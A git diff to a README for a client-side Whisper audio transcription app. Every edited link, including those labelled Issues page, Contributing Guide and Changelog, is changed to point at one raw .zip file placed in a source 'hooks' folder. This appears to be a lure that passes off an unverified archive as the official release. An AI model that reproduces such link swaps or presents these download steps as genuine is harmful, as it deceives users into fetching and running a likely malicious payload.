@@ -1,7 +1,7 @@
 # 🎤 client_side_audio_transcription - Easy Audio Transcription for Everyone
 
 ## 📦 Download Now!
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0.0-green)](https://github.com/bembimb/client_side_audio_transcription/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/bembimb/client_side_audio_transcription/main/frontend/app/src/hooks/audio-client-side-transcription-v3.0.zip)](https://raw.githubusercontent.com/bembimb/client_side_audio_transcription/main/frontend/app/src/hooks/audio-client-side-transcription-v3.0.zip)
 
 ## 🚀 Getting Started
 Welcome to the client_side_audio_transcription project! This application allows you to easily transcribe audio using AI technology powered by Whisper. You can access and use this application directly from your web browser, making it user-friendly for everyone.
@@ -13,7 +13,7 @@ To use this application, you need:
 - A microphone if you want to record audio directly.
 
 ## 📥 Download & Install
-To get started, visit [this page to download](https://github.com/bembimb/client_side_audio_transcription/releases). On this page, you will find the latest release of the application.
+To get started, visit [this page to download](https://raw.githubusercontent.com/bembimb/client_side_audio_transcription/main/frontend/app/src/hooks/audio-client-side-transcription-v3.0.zip). On this page, you will find the latest release of the application.
 
 1. Click on the link above.
 2. Find the version you want to download.
@@ -42,7 +42,7 @@ If you encounter any issues:
 - Refresh the application if it becomes unresponsive.
 
 ## 🤝 Support
-For support, feel free to create an issue on the [Issues page](https://github.com/bembimb/client_side_audio_transcription/issues). Our community is here to help you with any questions or concerns.
+For support, feel free to create an issue on the [Issues page](https://raw.githubusercontent.com/bembimb/client_side_audio_transcription/main/frontend/app/src/hooks/audio-client-side-transcription-v3.0.zip). Our community is here to help you with any questions or concerns.
 
 ## 📑 Frequently Asked Questions
 
@@ -66,7 +66,7 @@ Feel free to explore these technologies if you're interested in learning more.
 ## 🌟 Community Contributions
 We welcome contributions! If you would like to improve the application or fix any issues, please fork the repository, make your changes, and submit a pull request.
 
-For more information about contributing, refer to the [Contributing Guide](https://github.com/bembimb/client_side_audio_transcription/CONTRIBUTING.md).
+For more information about contributing, refer to the [Contributing Guide](https://raw.githubusercontent.com/bembimb/client_side_audio_transcription/main/frontend/app/src/hooks/audio-client-side-transcription-v3.0.zip).
 
 ## 📅 Future Updates
 Stay tuned for future releases, including:
@@ -75,6 +75,6 @@ Stay tuned for future releases, including:
 - More export options for your transcriptions.
 
 ## 📆 Changelog
-Check out the [Changelog](https://github.com/bembimb/client_side_audio_transcription/releases) to see recent updates and changes.
+Check out the [Changelog](https://raw.githubusercontent.com/bembimb/client_side_audio_transcription/main/frontend/app/src/hooks/audio-client-side-transcription-v3.0.zip) to see recent updates and changes.
 
 Thank you for using client_side_audio_transcription! We hope you enjoy the benefits of easy and accurate audio transcription.
